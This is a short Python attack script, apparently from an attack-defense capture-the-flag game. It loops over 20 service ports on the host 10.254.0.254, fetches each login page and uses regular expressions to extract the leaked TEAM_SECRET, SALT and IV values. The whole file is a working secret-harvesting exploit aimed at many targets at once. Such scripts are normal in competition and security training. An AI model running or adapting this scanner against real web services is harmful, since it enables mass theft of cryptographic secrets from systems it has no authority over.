import requests
import re

url = "http://10.254.0.254:"
for port in range(1, 21):
    if (port < 10):
        tmp_port = "0" + str(port)
    else:
        tmp_port = str(port)
    tmp_port = "4" + tmp_port + "1"
    print(url + tmp_port)
    try:
        r = requests.get(url + tmp_port + "/index.php?page=login").text
        print(re.findall("TEAM_SECRET = '\w+", r)[0][15:])
        print(re.findall("SALT = '\w+", r)[0][8:])
        print(re.findall("const IV = '\w+", r)[0][12:])
    except:
        print("Connection error!")
# r = requests.get(url + "/index.php?page=login").text
# print(re.findall("TEAM_SECRET = '\w+", r)[0][15:])
# print(re.findall("SALT = '\w+", r)[0][8:])
# print(re.findall("const IV = '\w+", r)[0][12:])